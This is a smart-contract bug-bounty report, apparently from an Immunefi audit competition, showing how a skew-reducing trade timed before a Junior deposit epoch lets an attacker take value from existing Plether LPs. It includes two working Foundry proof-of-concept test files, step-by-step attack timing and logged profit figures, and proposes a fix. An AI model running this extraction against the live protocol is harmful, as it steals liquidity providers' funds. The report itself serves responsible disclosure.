# \#98030 [SC-Critical] A skew-reducing open's VPI rebate is paid from pool cash but its guaranteed clawback is left out of LP NAV, so a Junior deposit activated in that window takes value from existing Junior LPs

**Submitted on Nov 4th 2026 at 13:49:19 UTC by @redbaron for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98030
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

When an open reduces existing skew, the trader receives a negative VPI rebate R. `CfdEngineSettlementSidecar` pays R in cash from `HousePool` at once, so `pool.totalAssets()` and Junior NAV fall by R. In return, the trader must lock a non-withdrawable reserve of `max(-vpiAccrued, 0)` = R from their own collateral, and the lifetime clamp sends that reserve back to the pool when the position closes. The pool is therefore certain to recover R, but the LP price snapshot counts neither the reserve nor the receivable.

An unprivileged actor with a pending Junior deposit can use this. They open a skew-reducing position just before the deposit epoch, let the deposit activate at the depressed NAV through the permissionless `settleLpEpoch`, and close the position. The clawback restores R to the pool, and the new shares hold their pro-rata part of it. That part comes out of the existing Junior LPs' accrued value.

In the PoC, with release parameters, a 10M USDG Junior tranche and an ordinary 3.9M one-sided skew left by another trader, the existing Junior LP loses **3,797.84 USDG** against the no-attack baseline. The attacker makes a net profit of **678.23 USDG** per cycle after all fees.

## Vulnerability Details

Line numbers refer to `immunefi-team/audit-comp-plether` at a82d4fe. The in-scope code is identical to the Arbitrum Sepolia v2.0.0 release commit 1209ca8.

### 1. The plan pays the rebate from the pool and sizes an equal reserve

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:333 and :348-349
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
...
delta.vpiRebateReserveAfterAssets =
    _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued + openState.vpiAssets);   // max(-vpiAccrued, 0)
```

### 2. The sidecar moves the cash out of the pool and locks the trader's reserve

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:442-444
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
// :466-478
if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
    ...
    clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
    ...
    clearinghouse.reclassifyPnlPledgeToVpiRebateReserve(delta.account, delta.vpiRebateReserveFromPledgeAssets);
}
```

In the PoC, `pool.totalAssets()` goes from 10,009,603.48 to 10,002,005.78 USDG at the open. The reserve stays in the trader's clearinghouse account, and the trader cannot withdraw it while the position is open.

### 3. The LP price snapshot ignores the receivable

```solidity
// packages/perps/src/CfdEngineProtocolLens.sol:61-70
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
...
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
```

Reconcile, deposit activation and redemption are all priced from this snapshot. The terminal book carries marked price PnL only, and `SECURITY.md:863` and `:872` confirm that VPI and its reserve stay outside it. Nothing adds back the R that the pool will reclaim by rule.

### 4. The close sends R back to the pool

`CloseAccountingLib.sol:113-117` clamps the close so lifetime VPI cannot go below zero, which forces the closing position to repay the full R. `CfdEnginePlanLib.sol:1050-1057` turns that into `vpiRebateReserveConsumedAssets`. `MarginClearinghouse.consumeVpiRebateReserve` (`:885-905`) transfers it from the trader's reserve to the pool. This still happens when depth has grown in the meantime, as it does here because the attacker's own deposit doubles it, since the clamp forces the full R back.

### 5. Deposit activation runs between the payout and the clawback

`OrderRouter.settleLpEpoch(bytes[])` is permissionless. No check looks at outstanding negative VPI. `SECURITY.md:873` blocks activation only on a terminal deficit, and this is not one.

So the LP entry price is net of value that the pool is certain to recover. Whoever enters while the rebate is outstanding takes part of that recovery from the LPs who were already in. `SECURITY.md:860` states the intended property: new LPs "do not inherit old trader obligations at a higher deposit NAV". The mirror case breaks it: new LPs inherit a pool receivable at a lower deposit NAV.

### Relation to prior audits and known issues

I checked every prior report listed on the competition page, the repo `audits/` folder and `SECURITY.md`.

- The VPI items in the prior audits are about other things. The pre-audit M-3 covers the negative-VPI IMR projection for trader margin and is fixed. Cecuro LOW-30 covers preview diagnostics. The scan Info item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" is about the size of a trader's close rebate, not LP share pricing.
- The pre-audit H-1, "Deposit Before Yield is Accrued", covered unaccrued Senior yield in an older HousePool and is fixed by a rewrite. The mechanism here is different: a pool-paid VPI rebate whose clawback is reserve-backed.
- `SECURITY.md:872` keeps "anticipated VPI and its reserve" out of terminal K and NAV so that they cannot *inflate* it. It does not address the case here, where the pool has already paid the rebate in cash and leaving the receivable out *deflates* the entry price.
- MED-24 and MED-29 (refund epochs and redemption rounding) and HIGH-1 (clock alignment) are unrelated.
- No issue, PR or commit in `immunefi-team/audit-comp-plether` or `Plether-Fi/plether-core` describes it. I checked on 2026-11-04.

This is a separate bug from one where positive VPI charged at open is counted as LP revenue. The two have different code paths and different fixes. I checked this directly. With a fix for the positive-VPI revenue booking applied (positive VPI retained out of NAV until close), this PoC still passes, and the victim then ends **below its deposit** (`V below its deposit after O closes? true`), because its NAV no longer contains the other trader's charge as a cushion. Conversely, the fix below does not change the positive-VPI case.

### Recommended fix

Treat the funded negative-VPI reserve as a pool receivable when pricing LP entry and exit, or do not pay the rebate from pool cash while it can still be clawed back. The minimal fix I tested does the first:

1. Keep an aggregate `totalVpiRebateReserveAssets` in `MarginClearinghouse`. Update it in `lockVpiRebateReserve`, `reclassifyPnlPledgeToVpiRebateReserve`, `releaseVpiRebateReserve` and `consumeVpiRebateReserve`.
2. Add that aggregate to `terminalLpPriceDeltaAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot`. That way it counts in ownership pricing but not as redeemable cash, like the other marked receivables.

With that fix the same PoC fails: the attacker's Junior delta is +0.0125 USDG, the victim's is +0.0125 USDG, and the attacker loses 3,120 USDG.

## Impact Details

Value moves from the existing Junior LPs to the new depositor, through permissionless calls only. In the PoC, the victim's value is accrued Junior NAV that it has not withdrawn, and it stays above its nominal deposit. That matches the High impact "Theft of unclaimed yield". I do not claim Critical. When the victim's NAV has no revenue cushion, the same transfer cuts into principal, as the fix-interaction run above shows.

Per cycle, with existing skew s0 that the attacker's open removes, depth D before activation, and attacker Junior share f after activation:

1. R = vpiFactor · s0² / (2D)
2. The attacker's LP gain is f · R, and the existing LPs lose about the same amount.
3. The attacker pays two execution fees, 2 · 4 bps · s0, plus the adverse confidence shift on both fills.
4. At the release max skew (s0 = 0.4 · D), R = 0.002 · s0, so the attack is profitable when f > 0.4.

PoC numbers at release parameters (victim Junior 10M USDG, unrelated trader long skew 3.9M, attacker deposit 10M, so f = 0.5):

| | USDG |
|---|---|
| Rebate R paid from the pool at open (`vpiAccrued`) | −7,597.70 |
| Attacker Junior value vs baseline | +3,798.25 |
| Victim Junior value vs baseline | −3,797.84 |
| Attacker trading cost (2 × 1,560 fee, carry) | 3,120.22 |
| Attacker net profit | **+678.23** |

With the release adverse-confidence multiplier (2,500 bps) and mocked Pyth confidence:

| Pyth confidence | Attacker net | Victim vs baseline |
|---|---|---|
| 0 | +678.23 | −3,797.84 |
| 1 bp of price | +532.17 | −3,651.76 |
| 5 bp | −52.08 | −3,067.43 |
| 10 bp (policy cap) | −782.41 | −2,336.98 |

The victim loses in every case. The attacker profits up to roughly 4 bp of confidence at f = 0.5, and the margin grows with a larger deposit (higher f) or a larger pool, because everything scales linearly with size. In the unprofitable cases the victim still loses about 3 to 59 times what the attacker spends net. The program says capital below 100M USD is not a reason to downgrade, and that low ROI alone does not justify one. Each LP epoch with a large one-sided skew left by other traders is exposed. After the 1-hour deposit cooldown, the attacker can redeem and set up the next deposit.

## References

1. `packages/perps/src/libraries/CfdEnginePlanLib.sol:333`, `:348-349`, `:1050-1057`
2. `packages/perps/src/CfdEngineSettlementSidecar.sol:442-444`, `:466-478`
3. `packages/perps/src/MarginClearinghouse.sol:843-866` (reserve lock) and `:885-905` (`consumeVpiRebateReserve`)
4. `packages/perps/src/CfdEngineProtocolLens.sol:61-70` (LP price snapshot)
5. `packages/perps/src/libraries/CloseAccountingLib.sol:113-117` (lifetime clamp)
6. `packages/perps/src/OrderRouter.sol:85`, `:240`, `:479`
7. `packages/perps/SECURITY.md:860`, `:863`, `:872`, `:873`
8. Release parameters: `packages/perps/DEPLOYMENT.md`


## Link to Proof of Concept

https://gist.github.com/the-red-ace/56496ef7c832d7ea42ff516a92211877

## Proof of Concept

## Proof of Concept

Gist: https://gist.github.com/the-red-ace/56496ef7c832d7ea42ff516a92211877. It contains `VpiDepositExtraction.t.sol`, `VpiDepositExtractionConfidence.t.sol` and `README.md`.

The tests run in the repo's own Foundry suite at a82d4fe and extend its `BasePerpTest`. No in-scope contract is changed. The only mocks are Pyth update data and USDG, which the program allows. Risk parameters are the release values from DEPLOYMENT.md, and the test asserts `engine.executionFeeBps() == 4`. The attack uses only public entry points called from EOAs: `TrancheVault.requestDeposit` / `claimDeposit`, `OrderRouter.commitOrder`, `OrderRouter.executeOrder` (the attacker acts as its own permissionless keeper) and `OrderRouter.settleLpEpoch(bytes[])`. No role is pranked. `_initialJuniorDeposit` returns 0 only to remove the fixture's default LP, so the victim is the only existing Junior holder. It does not change protocol behaviour.

### What the tests show

1. `VpiDepositExtraction.t.sol::test_compare` sets up a victim V with 10M USDG in Junior. An unrelated trader O opens a 3.9M LONG, which is an ordinary one-sided skew. The attacker A requests a 10M Junior deposit for the next epoch. The same timeline then runs twice from one snapshot:
    1. **Baseline:** the epoch settles, A claims its shares, and O later closes.
    2. **Attack:** 10 seconds before the epoch, the attacker's trading account T opens a 3.9M SHORT that removes the skew, and the pool pays T a 7,597.70 USDG rebate. An arbitrary EOA settles the epoch, A's deposit activates at the depressed NAV and A claims more shares, then T closes and the clamp returns the rebate from T's reserve to the pool. O closes as in the baseline.

   The test compares A's and V's final Junior value. It asserts that a rebate accrued, that A gains and that V loses, and it logs the attacker's net (LP gain minus T's total cost plus keeper bounty income).
2. `VpiDepositExtractionConfidence.t.sol` repeats the attack with the release adverse-confidence multiplier (2,500 bps, set through the normal 72-hour router config path) and Pyth confidence of 1, 5 and 10 bps of price. It asserts the attacker's profit at 1 bp and logs the net at 5 and 10 bps. It asserts the victim's loss in all three.

### Step by step setup from zero

1. Install Foundry (https://getfoundry.sh). These tests were run with forge 1.8.5. The suite pins solc 0.8.35.
2. Clone the competition repository at the frozen commit:
```bash
git clone https://github.com/immunefi-team/audit-comp-plether
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```
3. Copy the two files from the gist into `packages/perps/test/perps/`, next to `BasePerpTest.sol`.
4. Run:
```bash
cd packages/perps
forge test --match-path 'test/perps/VpiDepositExtraction*.t.sol' -vv
```
The first build uses `via_ir` and took about two minutes on our machine. Later runs take seconds.

### Test file `VpiDepositExtraction.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console} from "forge-std/console.sol";

/// Deposit-side attack through public entry points only:
/// OrderRouter.commitOrder / executeOrder / settleLpEpoch(bytes[]), TrancheVault.requestDeposit / claimDeposit.
contract VpiDepositExtractionTest is BasePerpTest {

    address A = address(0xA11CE); // attacker as LP (pending Junior deposit)
    address V = address(0xB0B); // existing Junior LP (victim)
    address O = address(0x0123); // unrelated trader that created the existing long skew
    address T = address(0x7777); // attacker as trader
    address K = address(0x1337); // attacker acting as permissionless keeper
    address S = address(0x5E77); // arbitrary EOA calling settleLpEpoch
    uint256 constant SKEW = 3_900_000e18;
    uint256 constant V_DEP = 10_000_000e6;
    uint256 constant A_DEP = 10_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Out {
        uint256 aValue;
        uint256 aShares;
        uint256 vValue;
        int256 vpi;
        uint256 tCost;
        int256 kGain;
        uint256 poolBeforeOpen;
        uint256 poolAfterOpen;
        uint256 poolAfterClose;
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a);
    }

    function _commitExec(address who, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, isClose ? 0 : 1e8, isClose);
        bytes[] memory upd = _mockPythUpdateData(1e8);
        vm.prank(K);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, upd);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
    }

    function _run(bool attack) internal returns (Out memory o) {
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        _fundJunior(V, V_DEP);

        // Unrelated trader O already holds a large long skew (release maxSkewRatio 0.4).
        _fundTrader(O, 1_000_000e6);
        _commitExec(O, CfdTypes.Side.LONG, SKEW, 400_000e6, false);

        // Attacker queues a Junior deposit for the next epoch.
        settlementToken.mint(A, A_DEP);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), A_DEP);
        uint256 rid = juniorVault.requestDeposit(A_DEP, A, A);
        vm.stopPrank();
        uint256 start = juniorVault.depositEpochStart(rid);
        if (block.timestamp + 10 < start) vm.warp(start - 10);

        uint256 kBefore = _bal(K);
        uint256 tBefore;
        if (attack) {
            _fundTrader(T, 200_000e6);
            tBefore = _bal(T);
            o.poolBeforeOpen = pool.totalAssets();
            // Skew-reducing SHORT right before the deposit epoch: pool pays a cash VPI rebate.
            _commitExec(T, CfdTypes.Side.SHORT, SKEW, 100_000e6, false);
            (,,,,,, o.vpi) = engine.positions(T);
            o.poolAfterOpen = pool.totalAssets();
            console.log("T vpiAccrued", o.vpi);
            console.log("pool.totalAssets before open", o.poolBeforeOpen);
            console.log("pool.totalAssets after open ", o.poolAfterOpen);
        }

        if (block.timestamp < start) vm.warp(start);
        bytes[] memory upd = _mockPythUpdateData(1e8);
        vm.prank(S);
        router.settleLpEpoch(upd);
        uint256 ca = juniorVault.claimableDepositRequest(rid, A);
        assertEq(ca, A_DEP, "A deposit claimable");
        vm.prank(A);
        o.aShares = juniorVault.claimDeposit(rid, ca, A, A);

        if (attack) {
            // Close the SHORT: lifetime clamp claws the full rebate back from T's dedicated reserve into the pool.
            _commitExec(T, CfdTypes.Side.SHORT, SKEW, 0, true);
            (uint256 sz,,,,,,) = engine.positions(T);
            assertEq(sz, 0, "closed");
            o.poolAfterClose = pool.totalAssets();
            console.log("pool.totalAssets after close", o.poolAfterClose);
            o.tCost = tBefore > _bal(T) ? tBefore - _bal(T) : 0;
            o.kGain = int256(_bal(K)) - int256(kBefore);
        }
        // O later closes its own long (same in baseline and attack).
        _commitExec(O, CfdTypes.Side.LONG, SKEW, 0, true);
        o.aValue = juniorVault.convertToAssets(o.aShares);
        o.vValue = juniorVault.convertToAssets(juniorVault.balanceOf(V));
        console.log("A shares", o.aShares);
        console.log("A junior value", o.aValue);
        console.log("V junior value", o.vValue);
    }

    function test_compare() public {
        uint256 snap = vm.snapshotState();
        Out memory b = _run(false);
        vm.revertToState(snap);
        Out memory a = _run(true);
        int256 aDelta = int256(a.aValue) - int256(b.aValue);
        int256 vDelta = int256(a.vValue) - int256(b.vValue);
        int256 net = aDelta - int256(a.tCost) + a.kGain;
        console.log("baseline A value", b.aValue);
        console.log("baseline V value", b.vValue);
        console.log("A shares baseline", b.aShares, "attack", a.aShares);
        console.log("A delta");
        console.logInt(aDelta);
        console.log("V delta");
        console.logInt(vDelta);
        console.log("T total cost", a.tCost);
        console.log("K bounty income");
        console.logInt(a.kGain);
        console.log("attacker net");
        console.logInt(net);
        assertLt(a.vpi, 0, "rebate accrued");
        assertGt(aDelta, 0, "A gains");
        assertLt(vDelta, 0, "V loses");
        console.log("V below its deposit after O closes?", a.vValue < V_DEP);
        console.log("V below its deposit in baseline?", b.vValue < V_DEP);
    }

}
```

### Test file `VpiDepositExtractionConfidence.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console} from "forge-std/console.sol";

/// Deposit-side attack through public entry points only:
/// OrderRouter.commitOrder / executeOrder / settleLpEpoch(bytes[]), TrancheVault.requestDeposit / claimDeposit.
contract VpiDepositExtractionConfidenceTest is BasePerpTest {
    uint256 internal CONF;
    bool internal REQUIRE_PROFIT;

    function _mockPythConf(uint256 price) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(price)), uint64(CONF), int32(-8), publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _releaseAdverse() internal {
        IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
        c.adverseConfidenceMultiplierBps = 2500; // DEPLOYMENT.md release value
        _setRouterConfig(c);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
    }

    function test_conf_1bp() public { _releaseAdverse(); CONF = 1e4; REQUIRE_PROFIT = true; _compareConf(); }
    function test_conf_5bp() public { _releaseAdverse(); CONF = 5e4; _compareConf(); }
    function test_conf_10bp_cap() public { _releaseAdverse(); CONF = 1e5; _compareConf(); }


    address A = address(0xA11CE); // attacker as LP (pending Junior deposit)
    address V = address(0xB0B); // existing Junior LP (victim)
    address O = address(0x0123); // unrelated trader that created the existing long skew
    address T = address(0x7777); // attacker as trader
    address K = address(0x1337); // attacker acting as permissionless keeper
    address S = address(0x5E77); // arbitrary EOA calling settleLpEpoch
    uint256 constant SKEW = 3_900_000e18;
    uint256 constant V_DEP = 10_000_000e6;
    uint256 constant A_DEP = 10_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Out {
        uint256 aValue;
        uint256 aShares;
        uint256 vValue;
        int256 vpi;
        uint256 tCost;
        int256 kGain;
        uint256 poolBeforeOpen;
        uint256 poolAfterOpen;
        uint256 poolAfterClose;
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + settlementToken.balanceOf(a);
    }

    function _commitExec(address who, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory upd = _mockPythConf(1e8);
        vm.prank(K);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, upd);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
    }

    function _run(bool attack) internal returns (Out memory o) {
        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        _fundJunior(V, V_DEP);

        // Unrelated trader O already holds a large long skew (release maxSkewRatio 0.4).
        _fundTrader(O, 1_000_000e6);
        _commitExec(O, CfdTypes.Side.LONG, SKEW, 400_000e6, false);

        // Attacker queues a Junior deposit for the next epoch.
        settlementToken.mint(A, A_DEP);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), A_DEP);
        uint256 rid = juniorVault.requestDeposit(A_DEP, A, A);
        vm.stopPrank();
        uint256 start = juniorVault.depositEpochStart(rid);
        if (block.timestamp + 10 < start) vm.warp(start - 10);

        uint256 kBefore = _bal(K);
        uint256 tBefore;
        if (attack) {
            _fundTrader(T, 200_000e6);
            tBefore = _bal(T);
            o.poolBeforeOpen = pool.totalAssets();
            // Skew-reducing SHORT right before the deposit epoch: pool pays a cash VPI rebate.
            _commitExec(T, CfdTypes.Side.SHORT, SKEW, 100_000e6, false);
            (,,,,,, o.vpi) = engine.positions(T);
            o.poolAfterOpen = pool.totalAssets();
            console.log("T vpiAccrued", o.vpi);
            console.log("pool.totalAssets before open", o.poolBeforeOpen);
            console.log("pool.totalAssets after open ", o.poolAfterOpen);
        }

        if (block.timestamp < start) vm.warp(start);
        bytes[] memory upd = _mockPythConf(1e8);
        vm.prank(S);
        router.settleLpEpoch(upd);
        uint256 ca = juniorVault.claimableDepositRequest(rid, A);
        assertEq(ca, A_DEP, "A deposit claimable");
        vm.prank(A);
        o.aShares = juniorVault.claimDeposit(rid, ca, A, A);

        if (attack) {
            // Close the SHORT: lifetime clamp claws the full rebate back from T's dedicated reserve into the pool.
            _commitExec(T, CfdTypes.Side.SHORT, SKEW, 0, true);
            (uint256 sz,,,,,,) = engine.positions(T);
            assertEq(sz, 0, "closed");
            o.poolAfterClose = pool.totalAssets();
            console.log("pool.totalAssets after close", o.poolAfterClose);
            o.tCost = tBefore > _bal(T) ? tBefore - _bal(T) : 0;
            o.kGain = int256(_bal(K)) - int256(kBefore);
        }
        // O later closes its own long (same in baseline and attack).
        _commitExec(O, CfdTypes.Side.LONG, SKEW, 0, true);
        o.aValue = juniorVault.convertToAssets(o.aShares);
        o.vValue = juniorVault.convertToAssets(juniorVault.balanceOf(V));
        console.log("A shares", o.aShares);
        console.log("A junior value", o.aValue);
        console.log("V junior value", o.vValue);
    }

    function _compareConf() internal {
        uint256 snap = vm.snapshotState();
        Out memory b = _run(false);
        vm.revertToState(snap);
        Out memory a = _run(true);
        int256 aDelta = int256(a.aValue) - int256(b.aValue);
        int256 vDelta = int256(a.vValue) - int256(b.vValue);
        int256 net = aDelta - int256(a.tCost) + a.kGain;
        console.log("baseline A value", b.aValue);
        console.log("baseline V value", b.vValue);
        console.log("A shares baseline", b.aShares, "attack", a.aShares);
        console.log("A delta");
        console.logInt(aDelta);
        console.log("V delta");
        console.logInt(vDelta);
        console.log("T total cost", a.tCost);
        console.log("K bounty income");
        console.logInt(a.kGain);
        console.log("CONF", CONF);
        console.log("attacker net");
        console.logInt(net);
        assertLt(a.vpi, 0, "rebate accrued");
        assertLt(vDelta, 0, "V loses");
        if (REQUIRE_PROFIT) assertGt(net, 0, "attacker net positive with release confidence costs");
        console.log("V below its deposit after O closes?", a.vValue < V_DEP);
        console.log("V below its deposit in baseline?", b.vValue < V_DEP);
    }

}
```

### Expected output

```
Ran 1 test for test/perps/VpiDepositExtraction.t.sol:VpiDepositExtractionTest
[PASS] test_compare() (gas: 26354551)
Logs:
  A shares 9992494317281733
  A junior value 9998883661943
  V junior value 10006485523128
  T vpiAccrued -7597703561
  pool.totalAssets before open 10009603479304
  pool.totalAssets after open  10002005775743
  pool.totalAssets after close 20009603503386
  A shares 10000085554753116
  A junior value 10002681911176
  V junior value 10002687678754
  baseline A value 9998883661943
  baseline V value 10006485523128
  A shares baseline 9992494317281733 attack 10000085554753116
  A delta
  3798249233
  V delta
  -3797844374
  T total cost 3120224082
  K bounty income
  200000
  attacker net
  678225151
  V below its deposit after O closes? false
  V below its deposit in baseline? false

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 58.13ms (52.16ms CPU time)

Ran 3 tests for test/perps/VpiDepositExtractionConfidence.t.sol:VpiDepositExtractionConfidenceTest
[PASS] test_conf_10bp_cap() (gas: 27136401)
  A delta 4287610143
  V delta -2336980998
  CONF 100000
  attacker net -782413927
[PASS] test_conf_1bp() (gas: 27105886)
  A delta 3847191814
  V delta -3651764762
  CONF 10000
  attacker net 532167733
[PASS] test_conf_5bp() (gas: 27136327)
  A delta 4042947457
  V delta -3067430623
  CONF 50000
  attacker net -52076616
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 59.03ms (127.08ms CPU time)
Ran 2 test suites in 59.64ms (117.17ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
(confidence suite: only the summary lines of each test are shown; run with -vv to see all logs)
```

### How to read the result

1. `T vpiAccrued -7597703561` is the rebate R the attacker's open received.
2. `pool.totalAssets before open 10009603479304` and `after open 10002005775743` show the pool paying R in cash.
3. `A shares baseline 9992494317281733 attack 10000085554753116` shows the attacker's deposit getting more shares because it activated at the depressed NAV.
4. `pool.totalAssets after close` includes R again, after the clamp consumed T's reserve.
5. `A delta 3798249233` and `V delta -3797844374` are the transfer from the victim to the attacker against the baseline.
6. `attacker net 678225151` is the attacker's profit after both execution fees, carry and keeper income: 678.23 USDG.
7. The confidence suite shows how the profit changes under the release confidence policy, and that the victim loses in every case.
